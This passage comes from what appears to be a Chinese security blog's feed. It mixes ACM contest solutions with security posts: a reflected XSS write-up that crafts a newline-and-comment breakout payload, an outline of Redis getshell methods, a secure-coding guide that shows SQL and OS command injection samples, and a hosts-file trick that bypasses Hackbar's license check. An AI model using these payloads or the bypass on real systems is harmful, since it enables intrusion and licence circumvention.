class="line">mi.sort()</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><h2 id="今天图书馆开了没？"><a href="#今天图书馆开了没？" class="headerlink" title="今天图书馆开了没？"></a>今天图书馆开了没？</h2><p><img src="https://i.loli.net/2020/04/25/FJ3xQpINd4v8Cfn.png" alt="今天图书馆开了没？.png"></p><h2 id="小明的体育课"><a href="#小明的体育课" class="headerlink" title="小明的体育课"></a>小明的体育课</h2><p><img src="https://i.loli.net/2020/04/25/drah6gTQ8yNcnxB.png" alt="小明的体育课.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">sys.stdout = codecs.getwriter(<span class="string">"utf-8"</span>)(sys.stdout.detach())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">n = int(input())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">i = <span class="number">2</span></span><br><span class="line">a = &#123;</span><br><span class="line"><span class="number">0</span>: <span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>: <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> i &lt;= n:</span><br><span class="line">a[i] = a[i<span class="number">-1</span>] + a[i<span class="number">-2</span>]</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">print(a[n])</span><br></pre></td></tr></table></figure><h2 id="孤独的字符串"><a href="#孤独的字符串" class="headerlink" title="孤独的字符串"></a>孤独的字符串</h2><p><img src="https://i.loli.net/2020/04/25/F4HTbzac2kmULZ9.png" alt="孤独的字符串.png"></p><h2 id="鲍勃的输入法"><a href="#鲍勃的输入法" class="headerlink" title="鲍勃的输入法"></a>鲍勃的输入法</h2><p><img src="https://i.loli.net/2020/04/25/u2AkWw8MENdGfhZ.png" alt="鲍勃的输入法.png"></p><h2 id="一起做课件"><a href="#一起做课件" class="headerlink" title="一起做课件"></a>一起做课件</h2><p><img src="https://i.loli.net/2020/04/25/xRg54Nb7nUpEqCa.png" alt="一起做课件1.png"><br><img src="https://i.loli.net/2020/04/25/jU8MIDceQ9CJnfF.png" alt="一起做课件2.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Alice的秘密&quot;&gt;&lt;a href=&quot;#Alice的秘密&quot; class=&quot;headerlink&quot; title=&quot;Alice的秘密&quot;&gt;&lt;/a&gt;Alice的秘密&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/04/25/mnPdtk
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis getshell的几种方法</title>
    <link href="https://p7e4.js.org/2020/04/18/redis_getshell/"/>
    <id>https://p7e4.js.org/2020/04/18/redis_getshell/</id>
    <published>2020-04-18T11:31:09.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Redis-getshell的几种方法"><a href="#Redis-getshell的几种方法" class="headerlink" title="Redis getshell的几种方法"></a>Redis getshell的几种方法</h2><ul><li>写文件<ul><li>写authorized_keys</li><li>写corntab</li><li>写/etc/passwd</li><li>写网站目录获取webshell</li></ul></li><li>主从复制</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Redis-getshell的几种方法&quot;&gt;&lt;a href=&quot;#Redis-getshell的几种方法&quot; class=&quot;headerlink&quot; title=&quot;Redis getshell的几种方法&quot;&gt;&lt;/a&gt;Redis getshell的几种方法&lt;/h2&gt;&lt;ul&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>北师珠ACM题库刷题记录</title>
    <link href="https://p7e4.js.org/2020/04/04/bsz_acm/"/>
    <id>https://p7e4.js.org/2020/04/04/bsz_acm/</id>
    <published>2020-04-04T11:12:59.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>莫名其妙被拉到一个acm比赛，那就试着刷一下题吧<code>-_-</code>  </p><h2 id="怡姐的游戏"><a href="#怡姐的游戏" class="headerlink" title="怡姐的游戏"></a>怡姐的游戏</h2><p><img src="https://i.loli.net/2020/04/04/NuZEBXWRaLT7m8b.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">a, b = input(), input()</span><br><span class="line">x = y = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> a:</span><br><span class="line">x *= ord(x1) - <span class="number">64</span></span><br><span class="line"><span class="keyword">for</span> y1 <span class="keyword">in</span> b:</span><br><span class="line">y *= ord(y1) - <span class="number">64</span></span><br><span class="line">answer = <span class="string">"Yes"</span> <span class="keyword">if</span> x % <span class="number">57</span> == y % <span class="number">57</span> <span class="keyword">else</span> <span class="string">"No"</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(answer)</span><br></pre></td></tr></table></figure><h2 id="nsy上初中"><a href="#nsy上初中" class="headerlink" title="nsy上初中"></a>nsy上初中</h2><p><img src="https://i.loli.net/2020/04/04/vQHqGOlnJoE3P8h.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">n = int(input().strip())</span><br><span class="line">answer = <span class="string">"yjznb!"</span> <span class="keyword">if</span> n <span class="keyword">else</span> <span class="string">"nsynb!"</span></span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(answer)</span><br></pre></td></tr></table></figure><p>不知道运行错误是什么情况，感觉是输入有问题(<del>疯狂甩锅</del>)</p><h2 id="The-World-砸瓦鲁多"><a href="#The-World-砸瓦鲁多" class="headerlink" title="The World 砸瓦鲁多"></a>The World 砸瓦鲁多</h2><p><img src="https://i.loli.net/2020/04/04/7Oqx2K4ENIHXgyB.png" alt><br>n个数分成m组 求所有组元素和的最小值<br>emmm，不会</p><h2 id="题到签"><a href="#题到签" class="headerlink" title="题到签"></a>题到签</h2><p><img src="https://i.loli.net/2020/04/03/TdUM4vm5xZnXGY1.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">a, b, c = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> input().split()]</span><br><span class="line">ans = min(a,b-c,c) - min(a,b,b-c) + min(a-b,b,c)</span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(<span class="string">"&#123;:.2f&#125;"</span>.format(ans))</span><br></pre></td></tr></table></figure><h2 id="我要看憨色直播"><a href="#我要看憨色直播" class="headerlink" title="我要看憨色直播"></a>我要看憨色直播</h2><p><img src="https://i.loli.net/2020/04/03/CPAZr1aEXUzNSV5.png" alt><br>迷宫问题，试了一下午，最后还是放弃挣扎</p><h2 id="舔狗的心酸，不用你来拆穿"><a href="#舔狗的心酸，不用你来拆穿" class="headerlink" title="舔狗的心酸，不用你来拆穿"></a>舔狗的心酸，不用你来拆穿</h2><p><img src="https://i.loli.net/2020/04/02/5EoOcBFmqvx9pJd.png" alt><br>有点迷，到点N的长度就是1 xor n?<br>试了一下，还真就过了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">n = int(input())</span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(<span class="number">1</span> ^ n)</span><br></pre></td></tr></table></figure><h2 id="校队选拔"><a href="#校队选拔" class="headerlink" title="校队选拔"></a>校队选拔</h2><p><img src="https://i.loli.net/2020/04/02/IxySDg1dmKvzNPG.png" alt><br>从a,b,(a+b+c)/3中取最小的即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">data = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> input().split()]</span><br><span class="line">data[<span class="number">0</span>], data[<span class="number">1</span>] = data[<span class="number">0</span>], data[<span class="number">1</span>]</span><br><span class="line">data[<span class="number">2</span>] = (data[<span class="number">0</span>] + data[<span class="number">1</span>] + data[<span class="number">2</span>]) / <span class="number">3</span> </span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(int(min(data)))</span><br></pre></td></tr></table></figure><h2 id="nsy上高中"><a href="#nsy上高中" class="headerlink" title="nsy上高中"></a>nsy上高中</h2><p><img src="https://i.loli.net/2020/04/02/32yRBUD1YqGbitx.png" alt><br>n本书分给m个人，没有顺序<br><code>C(n－1, m－1) = (n-1)! / (m-1)!(n-m)!</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">n, m = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> input().split()]</span><br><span class="line">tmp1, tmp2 = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(m, n):</span><br><span class="line">tmp1 *= x</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, n-m+<span class="number">1</span>):</span><br><span class="line">tmp2 *= x</span><br><span class="line">answer = int(tmp1 / tmp2)</span><br><span class="line"><span class="keyword">if</span> answer &gt; <span class="number">10</span> ** <span class="number">12</span>:</span><br><span class="line">answer = <span class="number">10</span> ** <span class="number">12</span></span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(answer)</span><br></pre></td></tr></table></figure><p>不过还是超时了，不知道还能怎么优化</p><h2 id="我有病，你有药吗？"><a href="#我有病，你有药吗？" class="headerlink" title="我有病，你有药吗？"></a>我有病，你有药吗？</h2><p><img src="https://i.loli.net/2020/04/02/v5nPERxkpuc4JzG.png" alt><br>偷个懒，用Pyhon的bin函数直接转换为二进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(len(str(bin(int(input()))).replace(<span class="string">"0"</span>,<span class="string">""</span>)) - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="单身狗也想要凑对"><a href="#单身狗也想要凑对" class="headerlink" title="单身狗也想要凑对"></a>单身狗也想要凑对</h2><p><img src="https://i.loli.net/2020/04/02/HstVQTbGpf9Jnxj.png" alt><br>2019可以分解为3 x 673，然后求倍数应该就行了，但我算的答案不对…<br>暴力是可行的，但是太花时间</p><h2 id="暗恋的密码"><a href="#暗恋的密码" class="headerlink" title="暗恋的密码"></a>暗恋的密码</h2><p><img src="https://i.loli.net/2020/04/02/Y9eoCg5jH1NrKtn.png" alt><br>这题我会</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = int(input().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">data = input().strip()</span><br><span class="line">data = re.split(<span class="string">r"\[|\]"</span>, data)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,len(data),<span class="number">2</span>):</span><br><span class="line">data[x] = re.sub(<span class="string">r"\d"</span>,<span class="string">""</span>,data[x]) * int(re.sub(<span class="string">r"\D"</span>,<span class="string">""</span>,data[x]))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Case #&#123;&#125;:"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">print(<span class="string">""</span>.join(data))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;莫名其妙被拉到一个acm比赛，那就试着刷一下题吧&lt;code&gt;-_-&lt;/code&gt;  &lt;/p&gt;
&lt;h2 id=&quot;怡姐的游戏&quot;&gt;&lt;a href=&quot;#怡姐的游戏&quot; class=&quot;headerlink&quot; title=&quot;怡姐的游戏&quot;&gt;&lt;/a&gt;怡姐的游戏&lt;/h2&gt;&lt;p&gt;&lt;img src
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一处有趣的反射型XSS</title>
    <link href="https://p7e4.js.org/2020/02/14/a_xss/"/>
    <id>https://p7e4.js.org/2020/02/14/a_xss/</id>
    <published>2020-02-14T21:46:25.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>一处有趣的反射型XSS</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>页面源码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//func('/xxxxxxxx?id=xss_payload');</span></span><br><span class="line">    <span class="built_in">window</span>.location = $url(<span class="string">"/abc?id=xss_payload"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  func(<span class="string">"xss_payload"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params">action</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">func</span><br><span class="line">(</span><br><span class="line"><span class="string">"xss_payload"</span>, </span><br><span class="line"><span class="string">""</span>,</span><br><span class="line"><span class="literal">null</span>,</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一个参数在页面的有4处输出点，都将双引号转义掉了<br>那么如何利用呢，既然第一处没有任何过滤就先从第一处下手<br>通过换行符%0a进行换脱离当前注释行<code>%0aalert(&quot;xss&quot;);//</code><br>然后代码就变成了这样  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//func('/xxxxxxxx?id=</span></span><br><span class="line">alert(<span class="string">"xss"</span>)<span class="comment">//');</span></span><br><span class="line">    <span class="built_in">window</span>.location = $url(<span class="string">"/abc?id=</span></span><br><span class="line"><span class="string">    alert("</span>xss<span class="string">")//"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  func(<span class="string">"</span></span><br><span class="line"><span class="string">  alert("</span>xss<span class="string">")//"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params">action</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">func</span><br><span class="line">(</span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">alert("</span>xss<span class="string">")//"</span>, </span><br><span class="line"><span class="string">""</span>,</span><br><span class="line"><span class="literal">null</span>,</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然第一处看起来没有问题了，但是后面的三处都因为首双引号没有闭合导致报错，payload也无法执行<br><code>SyntaxError: &quot;&quot; string literal contains an unescaped line break</code><br>因为双引号被过滤了，我们没有办法闭合双引号<br><em>那尝试一下多行注释?</em><br><code>/**/</code><br>构造payload: <code>%0A/**/alert(&quot;xss&quot;);/*</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//func('/xxxxxxxx?id=</span></span><br><span class="line"><span class="comment">/**/alert("xss");/*');</span></span><br><span class="line"><span class="comment">    window.location = $url("/abc?id=</span></span><br><span class="line"><span class="comment">    /**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">function B()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  func("</span></span><br><span class="line"><span class="comment">  /**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">function C(action)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">func</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">"</span></span><br><span class="line"><span class="comment">/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*", </span></span><br><span class="line"><span class="comment">"",</span></span><br><span class="line"><span class="comment">null,</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>这样看上去就ok了，乍一看最后一个<code>/*</code>还没有闭合，但是我得到的报错是<code>SyntaxError: missing } after function</code><br>继续往后看，这是因为后面还有注释刚好闭合掉了  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 描述xxxxxxxxxxxxx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@id </span>事件id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">H</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后在%0a后加入<code>}</code>进行闭合  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//func('/xxxxxxxx?id=</span></span><br><span class="line">&#125;<span class="comment">/**/alert("xss");/*');</span></span><br><span class="line"><span class="comment">    window.location = $url("/abc?id=</span></span><br><span class="line"><span class="comment">    &#125;/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">function B()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  func("</span></span><br><span class="line"><span class="comment">  &#125;/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">function C(action)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">func</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">"</span></span><br><span class="line"><span class="comment">&#125;/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*", </span></span><br><span class="line"><span class="comment">"",</span></span><br><span class="line"><span class="comment">null,</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>连弹4次框，（代码高亮有点小问题）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一处有趣的反射型XSS&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;页面源码：  &lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>安全编码规范</title>
    <link href="https://p7e4.js.org/2020/01/16/sec_code/"/>
    <id>https://p7e4.js.org/2020/01/16/sec_code/</id>
    <published>2020-01-16T23:46:25.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>(本文仅供参考，如有疏漏概不负责)<br>漏洞的产生有一个核心的点就是<strong>可控参数</strong>进入到了<strong>敏感函数</strong>  </p><p><strong>可控参数</strong>不仅仅指用户直接提交的内容，还包括间接可控的情况，比如一次写入到数据库，二次再取出来的情况就属于间接可控<br>所以开发安全第一要义是: <strong>不要相信一切来自用户的输入！！！</strong></p><p>以下据根据历史工单漏洞数排序  </p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>后端同学注意设置接口的Content-Type为JSON<br>模板可控参数请先用htmlspecialchars等进行转义<br>此外，还可设置httponly和加CSP等进行进一步加固  </p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>错误示范：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id = $_REQUEST[<span class="string">"id"</span>];</span><br><span class="line">...</span><br><span class="line">$sql = <span class="string">"SELECT coloum FROM table where id = "</span> . $id;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>SQL注入注意使用参数化查询(预编译也行)即可，除非参数可控，不然一般不要偷懒用拼接的方式<br>正确写法：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db.fetchone(&quot;SELECT coloum FROM table where id = ?&quot;, $id);</span><br></pre></td></tr></table></figure><h2 id="OS命令注入"><a href="#OS命令注入" class="headerlink" title="OS命令注入"></a>OS命令注入</h2><p><code>shell_exec(&quot;nslookup &quot;$_GET[&#39;domain&#39;]&quot;);</code><br>根据业务需要使用正则等方式校验内容，特别是符号<br>在PHP中可使用escapeshellcmd(arg)进行过滤，需要注意的是escapeshellcmd不转义匹配的单引号导致参数可控  </p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>稍微成熟一点的框架都会有CSRF(Token)的相关内容<br>开发同学请多读一下官方文档即可  </p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>这个也没啥好说的，做好权限控制划分，敏感操作先鉴权<br>不要依赖前端校验  </p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>特别的漏洞遇到的暂时比较少，有特别的再总结吧  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;(本文仅供参考，如有疏漏概不负责)&lt;br&gt;漏洞的产生有一个核心的点就是&lt;strong&gt;可控参数&lt;/strong&gt;进入到了&lt;strong&gt;敏感
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hackbar 破解</title>
    <link href="https://p7e4.js.org/2020/01/14/hackbar/"/>
    <id>https://p7e4.js.org/2020/01/14/hackbar/</id>
    <published>2020-01-14T21:46:25.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>Hackbar会请求hackbar.site/ping/进行注册码验证<br>有师傅做了个网站06m.me来返回验证成功<br>所以改一下host就行<br><code>149.129.101.18    hackbar.site</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Hackbar会请求hackbar.site/ping/进行注册码验证&lt;br&gt;有师傅做了个网站06m.me来返回验证成功&lt;br&gt;所以改一下host就行&lt;br&gt;&lt;code&gt;149.129.101.18    hackbar.site&lt;/code&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>红帽杯线下赛</title>
    <link href="https://p7e4.js.org/2019/11/24/2019redhat/"/>
